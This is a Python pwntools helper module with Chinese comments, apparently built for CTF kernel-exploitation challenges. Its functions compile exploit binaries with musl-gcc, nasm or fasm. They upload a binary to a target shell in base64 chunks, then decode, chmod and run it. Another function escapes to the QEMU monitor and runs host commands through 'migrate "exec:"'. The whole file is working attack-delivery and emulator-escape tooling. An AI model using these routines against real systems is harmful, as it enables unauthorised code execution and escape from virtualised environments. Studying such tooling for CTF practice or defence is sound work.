from pwn import *
import base64
import os
def kernel_musl(src = 'exp.c', target = 'exp', FLAGS = '-masm=intel'):
    '''
        使用musl编译程序
    '''
    os.system(f"musl-gcc {FLAGS} -Os -s -no-pie -static -Wl,--gc-sections -fno-stack-protector -o {target} {src}")

def kernel_nasm(src = 'exp.nasm', target = 'exp'):
    '''
        使用nasm编译程序
    '''
    os.system(f"nasm -f elf64 '{src}' -o '/tmp/{target}.o'")
    os.system(f"ld '/tmp/{target}.o' -o '{target}'")
    
def kernel_fasm(src = 'exp.nasm', target = 'exp'):
    os.system(f"fasm '{src}' '{target}'")

def kernel_exploit_data(p, data, exp_file = 'exp', exp_dir = '/tmp/', shflag = '/ $ ', run = True):
    '''
        向目标传输数据
        data        : exp数据
        exp_file    : exp文件名
        exp_dir     : exp传输到目标的目录
        shflag      : sh标识符
        run         : 传输完成后是否运行
    '''
    # 检查exp_dir是否是以'/'结尾
    if not exp_dir.endswith('/'):
        exp_dir += '/'
    
    # 编码exp
    exp = base64.b64encode(data)    
    
    p.sendline()
    p.recvuntil(shflag)
    
    # 传输exp
    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline(f"echo -n \"{exp[i:i + 0x200].decode()}\" >> {exp_dir}{exp_file}.b64")
        p.recvuntil(shflag)
        count += 1
        log.info("完成 : {:.2f} %".format(min(count * 0x200 * 100 / len(exp), 100.0)))
    log.success('传输exp.b64完成...')
    
    p.sendline(f"cat {exp_dir}{exp_file}.b64 | base64 -d > {exp_dir}{exp_file}")
    p.sendline(f"chmod +rwx {exp_dir}{exp_file}")
    if run == True:
        p.sendline(f"{exp_dir}{exp_file}")

def kernel_exploit_file(p, exp_file = 'exp', exp_dir = '/tmp/', shflag = '/ $ ', run = True):
    '''
        向目标传输文件
        p : 目标
        exp_file    : exp文件名
        exp_dir     : exp传输到目标的目录
        shflag      : sh标识符
        run         : 传输完成后是否运行
    '''
    # 读取文件
    with open(exp_file, "rb") as f:
        data = f.read()
    kernel_exploit_data(p, data, exp_file, exp_dir, shflag, run)
    
        
def kernel_qemu_start(p, shflag = '/ $ '):
    p.sendline()
    p.recvuntil(b'/ $ ')
    p.sendline(b'\x01' + b'\x63')
    result = p.recv()
    if b'(qemu)' in result:
        log.success('成功进入qemu...')
        print(result)
        return True
    else:
        log.failure('进入qemu失败...')
        print(result)
        return False

def kernel_qemu_cmd(p, cmd):
    p.sendline(f'migrate "exec: {cmd} 1>&2"')
    result = p.recv()
    print(result)
    return result

def kernel_template_C(exp):
    # 写入文件
    with open('/tmp/sh.c', 'w') as f:
        f.write(exp)
    # 编译文件
    kernel_musl('/tmp/sh.c', '/tmp/sh')
    # 读取文件
    with open('/tmp/sh', 'rb') as f:
        data = f.read()
    return data

def kernel_template_nasm(exp):
    # 写入文件
    with open('/tmp/sh.nasm', 'w') as f:
        f.write(exp)
    # 编译文件
    kernel_nasm('/tmp/sh.nasm', '/tmp/sh')
    # 读取文件
    with open('/tmp/sh', 'rb') as f:
        data = f.read()
    return data
    
def kernel_template_fasm(exp):
    # 写入文件
    with open('/tmp/sh.fasm', 'w') as f:
        f.write(exp)
    # 编译文件
    kernel_fasm('/tmp/sh.fasm', '/tmp/sh')
    # 读取文件
    with open('/tmp/sh', 'rb') as f:
        data = f.read()
    return data